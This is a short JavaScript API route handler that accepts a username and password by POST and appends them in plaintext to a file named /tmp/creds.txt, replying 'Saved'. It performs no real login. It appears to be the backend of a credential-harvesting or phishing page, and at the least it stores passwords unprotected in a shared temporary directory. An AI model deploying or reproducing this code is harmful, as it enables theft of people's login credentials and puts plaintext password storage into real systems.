export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;

    const fs = require('fs');
    const log = `Username: ${username}\nPassword: ${password}\n\n`;
    fs.appendFile('/tmp/creds.txt', log, err => {
      if (err) return res.status(500).send('Error saving credentials');
      return res.status(200).send('Saved');
    });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
